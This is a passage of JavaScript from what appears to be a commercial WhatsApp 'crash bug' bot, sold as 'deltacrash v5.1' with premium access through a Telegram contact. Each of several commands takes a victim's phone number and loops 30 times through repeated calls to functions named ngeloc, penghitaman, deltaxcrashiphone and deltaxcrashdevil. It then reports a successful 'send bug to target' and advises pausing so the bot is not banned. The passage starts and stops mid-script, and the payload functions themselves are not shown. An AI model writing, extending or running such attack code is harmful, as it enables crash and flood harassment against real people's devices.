await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'network-just': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'andronix-fc': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'andronix-xyz': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'andronix-vrs': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'andronix-war': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'vivo-wtf': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'andronix-xnxx': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'deltaxcrash-go': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
